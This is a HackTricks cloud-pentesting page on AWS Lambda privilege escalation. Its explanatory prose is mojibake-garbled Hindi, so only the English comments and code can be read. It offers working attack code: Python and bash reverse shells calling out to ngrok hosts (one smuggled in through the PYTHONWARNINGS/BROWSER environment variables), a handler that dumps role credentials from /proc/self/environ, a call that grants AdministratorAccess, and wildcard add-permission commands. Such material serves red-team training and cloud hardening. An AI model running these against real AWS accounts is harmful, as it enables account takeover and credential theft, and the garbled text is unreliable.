# AWS - Lambda Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## lambda

lambda рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction`, рдФрд░ `lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЕрдкрдиреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рд╡реЗ **рдПрдХ рдирдпрд╛ Lambda рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдПрдХ рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рд╕реМрдВрдк рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рд╕рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдЙрд╕ рднреВрдорд┐рдХрд╛ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдорд┐рд▓рддреА рд╣реИрдВред рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд┐рд░ **рдЗрд╕ Lambda рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдХреЛрдб рд▓рд┐рдЦ рдФрд░ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ rev shell)**ред\
рдПрдХ рдмрд╛рд░ рдлрд╝рдВрдХреНрд╢рди рд╕реЗрдЯрдЕрдк рд╣реЛ рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рдж, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ **рдЗрд╕рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ AWS API рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдЗрдЪреНрдЫрд┐рдд рдХреНрд░рд┐рдпрд╛рдПрдБ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рджреГрд╖реНрдЯрд┐рдХреЛрдг рдкреНрд░рднрд╛рд╡реА рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдХрд┐ рдЗрд╕рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд IAM рднреВрдорд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рджреА рдЧрдИ рдкрд╣реБрдБрдЪ рдХреЗ рд╕реНрддрд░ рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред\\

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **rev shell рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЯреЛрдХрди рдЪреБрд░рд╛ рд╕рдХрддрд╛ рд╣реИ**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
рдЖрдк **рд▓реИрдореНрдмреНрдбрд╛ рднреВрдорд┐рдХрд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рд╣реА рд╣реИрдВред\
рдпрджрд┐ рд▓реИрдореНрдмреНрдбрд╛ рднреВрдорд┐рдХрд╛ рдореЗрдВ рдкрд░реНрдпрд╛рдкреНрдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдереАрдВ, рддреЛ рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд▓рд┐рдП рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
рдпрд╣ рднреА рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗ рд▓рдореНрдмреНрдбрд╛ рдХреА рднреВрдорд┐рдХрд╛ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд▓реАрдХ рдХрд░реЗрдВред рдпрд╣ **Network isolated Lambdas** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ рдЬреЛ рдЖрдВрддрд░рд┐рдХ рдХрд╛рд░реНрдпреЛрдВ рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред рдпрджрд┐ рдЖрдкрдХреЗ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЕрдЬреНрдЮрд╛рдд рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореВрд╣ рд╣реИрдВ, рддреЛ рдпрд╣ рдХреЛрдб рдХрд╛ рдЯреБрдХрдбрд╝рд╛ рдЖрдкрдХреЛ рд▓рдореНрдмреНрдбрд╛ рдХреЗ рдЖрдЙрдЯрдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реАрдзреЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рд▓реАрдХ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдордирдорд╛рдиреЗ рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рднрд▓реЗ рд╣реА рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд▓рдЧ рд╕рдХрддрд╛ рд╣реИ **`lambda:InvokeAsync`** **рдЕрдкрдиреЗ рдЖрдк** **`aws lambda invoke-async`** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛, рдЖрдкрдХреЛ **`lambda:InvokeFunction`** рднреА рдЪрд╛рд╣рд┐рдПред
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

рдкрд┐рдЫрд▓реЗ рдкрд░рд┐рджреГрд╢реНрдп рдХреА рддрд░рд╣, рдЖрдк **`lambda:AddPermission`** рдЕрдиреБрдорддрд┐ рд╣реЛрдиреЗ рдкрд░ **рдЕрдкрдиреЗ рд▓рд┐рдП `lambda:InvokeFunction`** рдЕрдиреБрдорддрд┐ **рдкреНрд░рджрд╛рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдордирдорд╛рдиреЗ рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ред

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction`, рдФрд░ `lambda:CreateEventSourceMapping`** рдЕрдиреБрдорддрд┐рдпреЛрдВ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (рдФрд░ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ `dynamodb:PutItem` рдФрд░ `dynamodb:CreateTable`) рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВ** рднрд▓реЗ рд╣реА рдЙрдирдХреЗ рдкрд╛рд╕ `lambda:InvokeFunction` рди рд╣реЛред\
рд╡реЗ рдПрдХ **рджреБрд╖реНрдЯ рдХреЛрдб рдХреЗ рд╕рд╛рде рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рдореМрдЬреВрджрд╛ IAM рднреВрдорд┐рдХрд╛ рд╕реМрдВрдк рд╕рдХрддреЗ рд╣реИрдВ**ред

рд▓реИрдореНрдмреНрдбрд╛ рдХреЛ рд╕реАрдзреЗ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рдмрдЬрд╛рдп, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдореМрдЬреВрджрд╛ DynamoDB рддрд╛рд▓рд┐рдХрд╛ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдпрд╛ рдЙрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕реЗ рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рд╕рд╛рде рдПрдХ рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛрдбрд╝рддрд╛ рд╣реИред рдпрд╣ рд╕реЗрдЯрдЕрдк рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдирдП рдЖрдЗрдЯрдо рдХреЗ рдкреНрд░рд╡реЗрд╢ рдкрд░ рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди **рд╕реНрд╡рддрдГ рд╕рдХреНрд░рд┐рдп рд╣реЛ** рдЬрд╛рддрд╛ рд╣реИ, рдЪрд╛рд╣реЗ рд╡рд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд╣реЛ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рдФрд░ рдкрд╛рд╕ рдХреА рдЧрдИ IAM рднреВрдорд┐рдХрд╛ рдХреЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ред
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
рдпрджрд┐ DynamoDB рдкрд╣рд▓реЗ рд╕реЗ AWS рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗрд╡рд▓ **Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ DynamoDB рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ **рд╕реНрдЯреНрд░реАрдорд┐рдВрдЧ рд╕рдХреНрд╖рдо рдХреЗ рд╕рд╛рде рдПрдХ рдирдИ рддрд╛рд▓рд┐рдХрд╛ рдмрдирд╛рдиреА рд╣реЛрдЧреА**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
рдЕрдм рдпрд╣ рд╕рдВрднрд╡ рд╣реИ **Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ DynamoDB рддрд╛рд▓рд┐рдХрд╛ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдирд╛** **рдПрдХ рдЗрд╡реЗрдВрдЯ рд╕реНрд░реЛрдд рдореИрдкрд┐рдВрдЧ рдмрдирд╛рдХрд░**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЛ DynamoDB рд╕реНрдЯреНрд░реАрдо рд╕реЗ рд▓рд┐рдВрдХ рдХрд░рдХреЗ, рд╣рдорд▓рд╛рд╡рд░ **DynamoDB рд╕реНрдЯреНрд░реАрдо рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдХреЗ Lambda рдХреЛ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдпрд╣ **DynamoDB рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдПрдХ рдЖрдЗрдЯрдо рдбрд╛рд▓рдХрд░** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `lambda:AddPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЕрдкрдиреЗ рд▓рд┐рдП (рдпрд╛ рджреВрд╕рд░реЛрдВ рдХреЗ рд▓рд┐рдП) рдХреЛрдИ рднреА рдЕрдиреБрдорддрд┐ рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ** (рдпрд╣ рд╕рдВрд╕рд╛рдзрди рдЖрдзрд╛рд░рд┐рдд рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╕рдВрд╕рд╛рдзрди рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛ рд╕рдХреЗ):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `lambda:AddLayerVersionPermission`

рдЗрд╕ рдЕрдиреБрдорддрд┐ рдХреЗ рд╕рд╛рде рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **рдЕрдкрдиреЗ рд▓рд┐рдП (рдпрд╛ рджреВрд╕рд░реЛрдВ рдХреЗ рд▓рд┐рдП) рдЕрдиреБрдорддрд┐ `lambda:GetLayerVersion` рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рд╡рд╣ рд▓реЗрдпрд░ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдпрд╛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рд╕рдВрднрд╛рд╡рд┐рдд рдкрд╣реБрдВрдЪред

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** рдЕрдиреБрдорддрд┐ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕ **IAM рднреВрдорд┐рдХрд╛ рд╕реЗ рдЬреБрдбрд╝реЗ рдПрдХ рдореМрдЬреВрджрд╛ Lambda рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реИред**\
рд╣рдорд▓рд╛рд╡рд░ **IAM рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП Lambda рдХреЗ рдХреЛрдб рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред**

рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рд╕реАрдзреЗ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдпрджрд┐ Lambda рдлрд╝рдВрдХреНрд╢рди рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рдФрд░ рдХрд╛рд░реНрдпрд╛рддреНрдордХ рд╣реИ, рддреЛ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдореМрдЬреВрджрд╛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдпрд╛ рдШрдЯрдирд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕рдВрд╢реЛрдзрд┐рдд рдХреЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд░реВрдк рд╕реЗ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**рд╕рдВрднрд╛рд╡рд┐рдд рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд▓реИрдореНрдмреНрдбрд╛ рд╕реЗрд╡рд╛ рднреВрдорд┐рдХрд╛ рдХреЗ рд▓рд┐рдП рд╕реАрдзреЗ рдкреНрд░рд┐рд╡реЗрд╕реНрдХред

### `lambda:UpdateFunctionConfiguration`

#### env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде, рдРрд╕реЗ рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдЬреЛрдбрд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рд▓реИрдореНрдмреНрдбрд╛ рдХреЛ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдХрд╛рд░рдг рдмрдиреЗрдВрдЧреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкрд╛рдпрдерди рдореЗрдВ, рдкрд░реНрдпрд╛рд╡рд░рдг рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ `PYTHONWARNING` рдФрд░ `BROWSER` рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкрд╛рдпрдерди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдордирдорд╛рдиреЗ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

рдЕрдиреНрдп рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп env рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### Lambda Layers рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) рдЖрдкрдХреЛ рдЕрдкрдиреЗ рд▓реИрдореНрдмреНрдбрд╛ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ **рдХреЛрдб** рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рдЗрд╕реЗ рдЕрд▓рдЧ рд╕реЗ рд╕реНрдЯреЛрд░ рдХрд░рддрд╛ рд╣реИ**, рддрд╛рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рдЫреЛрдЯрд╛ рд░рд╣ рд╕рдХреЗ рдФрд░ **рдХрдИ рдлрд╝рдВрдХреНрд╢рди рдХреЛрдб рд╕рд╛рдЭрд╛ рдХрд░ рд╕рдХреЗрдВ**ред

рд▓реИрдореНрдмреНрдбрд╛ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рдЙрди рдкрдереЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдБ рд╕реЗ рдкрд╛рдпрдерди рдХреЛрдб рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
рдпреЗ рд╕реНрдерд╛рди рд╣реИрдВ:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
